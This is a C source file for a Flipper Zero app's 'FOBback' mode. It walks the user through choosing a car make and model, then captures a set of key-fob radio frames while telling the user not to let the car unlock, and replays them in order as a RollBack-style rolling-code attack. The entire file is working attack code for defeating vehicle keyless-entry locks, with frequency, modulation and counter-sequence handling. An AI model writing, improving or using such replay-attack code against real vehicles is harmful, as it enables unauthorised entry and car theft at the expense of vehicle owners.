#include "../flipper_fobscan_app.h"
#include <notification/notification_messages.h>
#include <string.h>
#include <stdio.h>

/* ─────────────────────────────────────────────────────────────────────────── */
/* FOBback guides make and vehicle selection, then captures frames for ordered
   RollBack replay. */
/* ─────────────────────────────────────────────────────────────────────────── */

/* ── Make picker ─────────────────────────────────────────────────────────── */
static void fobback_make_cb(void* ctx, uint32_t idx) {
    FlipperApp* app = (FlipperApp*)ctx;
    if((int)idx >= flipper_fbk_make_count()) return;
    app->guided->fobback.make_idx  = (int)idx;
    app->guided->fobback.model_idx = -1;
    app->guided->fobback.profile   = NULL;
    scene_manager_next_scene(app->scene_manager, FlipperSceneFobbackModel);
}

void flipper_scene_fobback_make_on_enter(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    /* Allocate guided state on entry; the main menu releases it. Clear any
       state left from an earlier mode. */
    if(!flipper_guided_ensure(app, sizeof(FlipperFobbackState))) {
        submenu_reset(app->submenu);
        submenu_set_header(app->submenu, "FOBback: OOM");
        submenu_add_item(app->submenu, "Back", 0, NULL, app);
        view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
        return;
    }
    memset(&app->guided->fobback, 0, sizeof(app->guided->fobback));
    submenu_reset(app->submenu);
    int n = flipper_fbk_make_count();
    if(n <= 0) {
        submenu_set_header(app->submenu, "FOBback: catalog missing");
        submenu_add_item(app->submenu, "Back", 0, NULL, app);
        view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
        return;
    }
    submenu_set_header(app->submenu, "FOBback: Make");
    for(int i = 0; i < n; i++) {
        const FlipperFbkMake* mk = flipper_fbk_make_at(i);
        if(!mk || !mk->make) continue;
        submenu_add_item(app->submenu, mk->make,
                         (uint32_t)i, fobback_make_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
}
bool flipper_scene_fobback_make_on_event(void* ctx, SceneManagerEvent e) {
    UNUSED(ctx); UNUSED(e); return false;
}
void flipper_scene_fobback_make_on_exit(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    submenu_reset(app->submenu);
}

/* ── Model picker ────────────────────────────────────────────────────────── */
static void fobback_model_cb(void* ctx, uint32_t idx) {
    FlipperApp* app = (FlipperApp*)ctx;
    int mi = app->guided->fobback.make_idx;
    const FlipperFbkMake* mk = flipper_fbk_make_at(mi);
    if(!mk) return;
    if((int)idx >= mk->model_count) return;
    app->guided->fobback.model_idx = (int)idx;
    app->guided->fobback.profile   = flipper_fbk_model_profile(mi, (int)idx);
    scene_manager_next_scene(app->scene_manager, FlipperSceneFobbackListen);
}

void flipper_scene_fobback_model_on_enter(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "FOBback: Vehicle");
    int mi = app->guided->fobback.make_idx;
    const FlipperFbkMake* mk = flipper_fbk_make_at(mi);
    if(!mk) {
        scene_manager_previous_scene(app->scene_manager); return;
    }
    int mc = mk->model_count;
    for(int i = 0; i < mc; i++) {
        const char* mname = flipper_fbk_model_name(mi, i);
        if(mname) submenu_add_item(app->submenu, mname,
                                   (uint32_t)i, fobback_model_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
}
bool flipper_scene_fobback_model_on_event(void* ctx, SceneManagerEvent e) {
    UNUSED(ctx); UNUSED(e); return false;
}
void flipper_scene_fobback_model_on_exit(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    submenu_reset(app->submenu);
}

/* ── Listen / replay screen ──────────────────────────────────────────────── */
/* Input handlers change state directly, so commit the model after visible
   updates or the screen will not repaint until it is switched. */
static void fobback_redraw(FlipperApp* app) {
    view_get_model(app->fobback_view);
    view_commit_model(app->fobback_view, true);
}

void flipper_fobback_draw_cb(Canvas* canvas, void* model) {
    /* The view model holds the FlipperApp pointer. */
    FlipperApp* app = *(FlipperApp**)model;
    FlipperFobbackState* fb = &app->guided->fobback;
    const FlipperFbkProfile* p = fb->profile;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 0, 10, "FOBback");
    canvas_set_font(canvas, FontSecondary);

    if(p) {
        canvas_draw_str(canvas, 0, 20, p->name);
        char mode_str[40];
        const FlipperFbkMake* dmk = flipper_fbk_make_at(fb->make_idx);
        snprintf(mode_str, sizeof(mode_str), "%s  n=%d  %s",
                 (dmk && dmk->make) ? dmk->make : "",
                 p->n_captures,
                 p->seq == FbkSeqLoose ? "Loose" : "Strict");
        canvas_draw_str(canvas, 0, 29, mode_str);
    }
    canvas_draw_line(canvas, 0, 32, 127, 32);

    if(!fb->armed) {
        canvas_draw_str(canvas, 0, 43, "Arming CC1101...");
        return;
    }
    if(fb->ready) {
        canvas_set_font(canvas, FontPrimary);
        char line[36];
        snprintf(line, sizeof(line), "%d captures — READY", fb->cap_count);
        canvas_draw_str(canvas, 0, 43, line);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 55, "[OK] = REPLAY sequence");
        canvas_draw_str(canvas, 0, 63, "[Back] = exit");
    } else {
        int need = p ? p->n_captures : 2;
        char line[40];
        snprintf(line, sizeof(line), "Captures: %d / %d", fb->cap_count, need);
        canvas_draw_str(canvas, 0, 43, line);
        canvas_draw_str(canvas, 0, 53, "Press fob. Don't unlock.");
        if(p && p->note[0]) canvas_draw_str(canvas, 0, 63, p->note);
    }
}

bool flipper_fobback_input_cb(InputEvent* e, void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    if(e->type == InputTypeShort && e->key == InputKeyOk && app->guided->fobback.ready) {
        view_dispatcher_send_custom_event(app->view_dispatcher, FlipperEventReplayDone);
        return true;
    }
    return false;
}

/* ── Strict counter-sequence validation ──────────────────────────────────── */
static bool fbk_is_ready(FlipperFobbackState* fb) {
    const FlipperFbkProfile* p = fb->profile;
    if(!p || fb->cap_count < p->n_captures) return false;
    if(p->seq == FbkSeqLoose) return true;

    for(int i = 1; i < p->n_captures; i++) {
        uint32_t delta = (fb->caps[i].decode.cnt - fb->caps[i-1].decode.cnt) & 0xFFFF;
        if(delta == 0 || delta > 64) return false;
    }
    return true;
}

static void fobback_edge_cb(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    view_dispatcher_send_custom_event(app->view_dispatcher, FlipperEventCaptureDone);
}

void flipper_scene_fobback_listen_on_enter(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    FlipperFobbackState* fb = &app->guided->fobback;

    fb->cap_count = 0;
    fb->armed     = false;
    fb->ready     = false;
    fb->tx_pending = false;
    memset(fb->caps, 0, sizeof(fb->caps));

    const FlipperFbkProfile* p = fb->profile;
    if(!p) { scene_manager_previous_scene(app->scene_manager); return; }

    app->capture->freq_mhz    = p->freqs[0];
    app->capture->preset       = (p->mod == FlipperMod2FSK) ?
                                  FlipperPreset2FSKDev238 : FlipperPresetOOK650;
    app->capture->squelch_dbm  = -90.0f;
    flipper_app_gui_radio_acquire(app);
    app->capture->on_edge      = fobback_edge_cb;
    app->capture->on_edge_ctx  = app;

    flipper_capture_start(app->capture);
    fb->armed = true;
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewFobback);
}

bool flipper_scene_fobback_listen_on_event(void* ctx, SceneManagerEvent e) {
    FlipperApp* app = (FlipperApp*)ctx;
    FlipperFobbackState* fb = &app->guided->fobback;
    if(e.type != SceneManagerEventTypeCustom) return false;

    if(e.event == FlipperEventCaptureDone && !fb->ready) {
        if(flipper_capture_flush(app->capture)) {
            FlipperCaptureResult* cr = &app->capture->result;
            const FlipperFbkProfile* p = fb->profile;
            if(cr->decode_ok && p) {
                /* Accept captures within ±1.2 MHz of a profile frequency. */
                bool freq_ok = false;
                for(int f = 0; f < p->freq_count && !freq_ok; f++) {
                    float diff = cr->decode.freq_mhz - p->freqs[f];
                    if(diff < 0) diff = -diff;
                    if(diff <= 1.2f) freq_ok = true;
                }

                if(freq_ok && fb->cap_count < FLIPPER_FBK_CAPS_MAX) {
                    /* In strict mode, restart on a duplicate or large jump. */
                    if(p->seq == FbkSeqStrict && fb->cap_count > 0 &&
                       cr->decode.device_key_hex[0]) {
                        uint32_t delta = (cr->decode.cnt -
                                          fb->caps[fb->cap_count-1].decode.cnt) & 0xFFFF;
                        if(delta == 0 || delta > 64) fb->cap_count = 0;
                    }
                    fb->caps[fb->cap_count++] = *cr;
                    notification_message(app->notifications, &sequence_blink_blue_100);

                    if(fbk_is_ready(fb)) {
                        fb->ready = true;
                        notification_message(app->notifications, &sequence_success);
                        flipper_capture_stop(app->capture);
                    }
                }
            }
        }
        fobback_redraw(app);
        return true;
    }

    if(e.event == FlipperEventReplayDone && fb->ready) {
        if(fb->tx_pending) {
            fb->tx_pending = false;
            fb->cap_count = 0;
            fb->ready = false;
            memset(fb->caps, 0, sizeof(fb->caps));
            app->capture->on_edge = fobback_edge_cb;
            app->capture->on_edge_ctx = app;
            flipper_capture_start(app->capture);
            fb->armed = true;
            fobback_redraw(app);
            return true;
        }
        const FlipperFbkProfile* p = fb->profile;
        uint32_t delay_ms = 80;
        if(p->timeframe_s > 0 && p->n_captures > 1)
            delay_ms = (uint32_t)((p->timeframe_s * 1000u) / (uint32_t)(p->n_captures + 1));

        bool ok = flipper_capture_tx_sequence(
            app->capture,
            fb->caps, fb->cap_count,
            p->freqs[0],
            (p->mod == FlipperMod2FSK) ? FlipperPreset2FSKDev238 : FlipperPresetOOK650,
            delay_ms);

        fb->tx_pending = ok;
        notification_message(app->notifications, ok ? &sequence_success : &sequence_error);
        if(!ok) fb->ready = false;
        fobback_redraw(app);
        return true;
    }

    if(e.event == FlipperEventStatusTick) {
        /* Periodic repaint (e.g. "Arming..." → capture progress). */
        fobback_redraw(app);
        return true;
    }
    return false;
}

void flipper_scene_fobback_listen_on_exit(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    flipper_capture_stop(app->capture);
    flipper_capture_tx_wait_stopped(app->capture);
    app->capture->on_edge     = NULL;
    app->capture->on_edge_ctx = NULL;
    app->guided->fobback.armed = false;
    app->guided->fobback.ready = false;
    flipper_app_gui_radio_release(app);
}
